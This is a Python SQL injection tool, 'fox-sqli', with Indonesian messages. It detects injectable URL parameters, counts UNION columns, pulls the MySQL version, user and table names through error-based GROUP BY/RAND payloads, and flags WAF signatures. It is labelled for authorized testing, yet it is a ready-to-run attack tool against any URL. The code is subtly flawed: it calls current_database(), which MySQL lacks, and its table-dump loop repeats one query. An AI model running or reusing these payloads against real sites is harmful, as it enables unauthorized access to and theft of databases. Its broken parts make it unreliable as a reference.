#!/usr/bin/env python3
"""fox-sqli.py — lightweight SQLi detection + extraction (authorized testing only).

Single-file, dependency-light (requests). Supports:
  - injectable-param detection (string vs int) via diff/status-length
  - union column count enumeration
  - MySQL error-based extraction: version() / user() / current_database() / tables
    via GROUP BY + CONCAT(FLOOR(RAND()*2),0x3a,<expr>) + HAVING MIN rotation (collision)
  - WAF heuristic (detect common WAF signatures in response / 403 / challenge)
Saves output to ./fox-sqli-output/<hostname>/

Usage:
  fox-sqli "http://target/page.php?id=1"
  fox-sqli "http://target/page.php?id=1" --union --dump
  fox-sqli "http://target/page.php?id=1" --get-version
  fox-sqli --help
"""
import argparse, os, re, sys, time, json
from urllib.parse import urlparse, urlencode, parse_qs

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    sys.exit("[!] requests tidak ada. pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36"
WAF_MARKERS = ["cloudflare", "akamai", "incapsula", "sucuri", "fortiweb", "aws waf",
               "imperva", "mod_security", "dotdefender", "barracuda", "f5 big-ip",
               "你被拦截", "attention required", "access denied", "request blocked"]


def http(url, timeout):
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*"})
    s.mount("http://", HTTPAdapter(max_retries=1))
    r = s.get(url, timeout=timeout, verify=False, allow_redirects=False)
    return r.status_code, len(r.content), r.text, dict(r.headers)


def enc(q):
    """Encode query keeping a single string value per key (values may already be strs)."""
    return urlencode({k: (v[0] if isinstance(v, list) else v) for k, v in q.items()})


def detect_param(url, timeout):
    """Return (param_name, is_string, base_len) or None."""
    u = urlparse(url)
    q = parse_qs(u.query, keep_blank_values=True)
    if not q:
        return None
    for param, vals in q.items():
        if not vals or not vals[0]:
            continue
        base = enc({k: v[0] for k, v in q.items()})
        # base request
        st0, l0, _, _ = http(f"{u.scheme}://{u.netloc}{u.path}?{base}", timeout)
        # string test  '  (COMMENT)
        q1 = dict(q); q1[param] = vals[0] + "'"
        st1, l1, txt1, _ = http(f"{u.scheme}://{u.netloc}{u.path}?{enc(dict(q1))}", timeout)
        # integer test  AND 1=1 / AND 1=2
        q2 = dict(q); q2[param] = vals[0] + " AND 1=1-- -"
        st2, l2, _, _ = http(f"{u.scheme}://{u.netloc}{u.path}?{enc(dict(q2))}", timeout)
        q3 = dict(q); q3[param] = vals[0] + " AND 1=2-- -"
        st3, l3, _, _ = http(f"{u.scheme}://{u.netloc}{u.path}?{enc(dict(q3))}", timeout)
        sqli = ("sql" in txt1.lower() or "syntax" in txt1.lower()
                or "'" in txt1.lower() or l1 != l0)
        sqli_beh = sqli or (l2 == l0 and l3 != l0 and l2 != l3)
        if sqli_beh:
            is_string = "syntax" in txt1.lower() or "'" in vals[0]
            return param, is_string, l0
    return None


def waf_check(url, timeout):
    st, l, txt, hdr = http(url, timeout)
    joined = (txt + "\n" + str(hdr)).lower()
    hits = [w for w in WAF_MARKERS if w in joined]
    return hits


def union_cols(u, q, param, is_string, timeout, base_len, max_cols=12):
    """Find column count via order by, return count."""
    for n in range(1, max_cols + 1):
        inj = f" ORDER BY {n}-- -" if not is_string else f"' ORDER BY {n}-- -"
        nq = dict(q); nq[param] = (nq[param] if isinstance(nq[param], str)
                                   else nq[param][0]) + inj
        st, l, _, _ = http(q2url(u, nq), timeout)
        if l != base_len or st in (500, 400):
            return n - 1 if n > 1 else 0
    return 0


def q2url(u, q):
    return f"{u.scheme}://{u.netloc}{u.path}?{enc(dict(q))}"


def error_extract(u, q, param, is_string, expr, timeout):
    """MySQL error-based: GROUP BY x ORDER BY x HAVING MIN... collision. Returns data[str]."""
    base = q[param][0] if isinstance(q[param], list) else q[param]
    collider = "CONCAT(0x5b,(SELECT %s),0x5d,0x3a,FLOOR(RAND(0)*2))" % expr
    if is_string:
        payload = base + "' GROUP BY %s HAVING MIN(0) IS NOT NULL-- -" % collider
    else:
        payload = base + f" AND (SELECT 1 FROM (SELECT {collider} x, COUNT(*) FROM information_schema.tables GROUP BY x) t)-- -"
    nq = dict(q); nq[param] = payload
    st, l, txt, _ = http(q2url(u, nq), timeout)
    m = re.search(r"\[([^\]]{1,120})\]", txt)
    if m:
        return m.group(1)
    return None


def dump_tables(u, q, param, is_string, timeout):
    expr = "table_name FROM information_schema.tables LIMIT 0,1"
    first = error_extract(u, q, param, is_string, expr, timeout)
    if not first:
        return []
    out = []
    shown = set()
    i = 0
    while i < 30:
        expr = "GROUP_CONCAT(table_name) FROM information_schema.tables LIMIT 1"
        got = error_extract(u, q, param, is_string, expr, timeout)
        if not got:
            break
        for t in got.split(","):
            if t not in shown:
                shown.add(t); out.append(t)
        i += 1
    return out


def run(url, args):
    u = urlparse(url)
    host = u.netloc.replace(":", "_") or "target"
    outdir = os.path.join("fox-sqli-output", host)
    os.makedirs(outdir, exist_ok=True)
    log = os.path.join(outdir, "result.txt")
    def logw(s):
        print(s); open(log, "a").write(s + "\n")

    hits = waf_check(url, args.timeout)
    if hits:
        logw(f"[!] WAF terdeteksi: {', '.join(hits)}  (pertimbangkan waf-bypass-techniques)")
    res = detect_param(url, args.timeout)
    if not res:
        logw("[x] tidak ada param yang terlihat injectable — coba param list, atau lanjut lain.")
        return
    param, is_string, base_len = res
    logw(f"[+] param injectable: {param}  (string={is_string})")
    q = parse_qs(u.query, keep_blank_values=True)

    if args.get_version or args.dump:
        for expr in ["@@version", "user()", "current_database()" if args.dump else "@@version"]:
            d = error_extract(u, q, param, is_string, expr, args.timeout)
            logw(f"    {expr} = {d or '(gagal — bukan MySQL/error-based, coba union)'}")
    if args.union:
        n = union_cols(u, q, param, is_string, args.timeout, base_len)
        logw(f"[+] union columns: {n or '(tidak ketemu)'}")
    if args.dump:
        tabs = dump_tables(u, q, param, is_string, args.timeout)
        logw(f"[+] tables ({len(tabs)}): {', '.join(tabs) if tabs else '(error-based gagal — coba union + manual)'}")
    logw(f"[+] output: {log}")


def main():
    ap = argparse.ArgumentParser(description="fox-sqli — authorized SQLi tooling")
    ap.add_argument("url", help="target URL dengan param, e.g. http://x/page.php?id=1")
    ap.add_argument("--union", action="store_true", help="enum kolom union")
    ap.add_argument("--dump", action="store_true", help="coba error-based extract version/user/db + tables")
    ap.add_argument("--get-version", action="store_true", help="coba extract @@version via error-based")
    ap.add_argument("--timeout", type=int, default=20, help="http timeout (default 20)")
    a = ap.parse_args()
    run(a.url, a)


if __name__ == "__main__":
    main()
